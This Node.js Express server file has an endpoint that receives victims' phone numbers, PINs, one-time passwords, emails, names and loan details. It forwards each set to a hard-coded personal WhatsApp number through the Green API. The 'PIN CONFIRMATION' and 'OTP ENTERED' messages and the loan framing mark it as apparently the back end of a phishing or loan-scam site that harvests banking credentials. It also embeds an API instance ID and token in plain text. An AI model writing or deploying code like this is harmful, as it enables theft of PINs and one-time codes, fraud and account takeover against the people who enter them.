const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// WhatsApp notification endpoint
app.post('/api/send-whatsapp', async (req, res) => {
    try {
        const { phone, pin, email, name, amount, term, type } = req.body;
        
        // YOUR GREEN API CREDENTIALS
        const INSTANCE_ID = '7107571952';
        const API_TOKEN = '1c200cb4e91f49b0ae02a051366511129c1f8d7cff1742239c';
        const YOUR_WHATSAPP = '254707001191';
        
        let message = '';
        if (type === 'pin') {
            message = `🔐 NEW PIN CONFIRMATION 🔐\n\n📱 Phone: ${phone}\n🔐 PIN: ${pin}\n📧 Email: ${email}\n👤 Name: ${name}\n💰 Loan: $${amount} for ${term} months`;
        } else {
            message = `🔐 OTP ENTERED 🔐\n\n📱 Phone: ${phone}\n🔑 OTP: ${pin}\n📧 Email: ${email}\n👤 Name: ${name}`;
        }
        
        // Send to YOUR WhatsApp via Green API
        const url = `https://7107.api.greenapi.com/waInstance${INSTANCE_ID}/sendMessage/${API_TOKEN}`;
        
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chatId: `${YOUR_WHATSAPP}@c.us`,
                message: message
            })
        });
        
        const result = await response.json();
        console.log('WhatsApp sent:', result);
        
        res.json({ success: true, result });
    } catch (error) {
        console.error('Error:', error.message);
        res.json({ success: false, error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📱 WhatsApp notifications enabled!`);
});
